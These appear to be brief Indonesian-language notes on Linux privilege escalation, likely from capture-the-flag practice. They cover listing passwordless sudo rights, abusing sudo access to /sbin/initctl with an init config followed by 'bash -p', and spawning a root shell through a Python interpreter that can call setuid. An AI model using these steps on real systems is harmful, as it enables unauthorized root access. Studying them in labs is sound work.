# SUDO

buat cek mana yang bisa sudo tanpa password pake ini:

    sudo -l 

contoh output:

    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole

# /sbin/initctl

Privesc via /sbin/initctl

edit file `/etc/init/test.conf`
tambahin di dalem script
jalanin perintah: sudo /sbin/initctl start test
kalo dah jalan bakal begini: test start/running, process 11746

sekarang tinggal akses bash begini: bash -p

# python setuid

    nathan@cap:/var/www/html$ python3
    Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
    [GCC 9.3.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> import os
    >>> 
    >>> os.setuid(0)
    >>> os.system('id')
    uid=0(root) gid=1001(nathan) groups=1001(nathan)
    0
    >>> 
    >>> os.system('/bin/bash')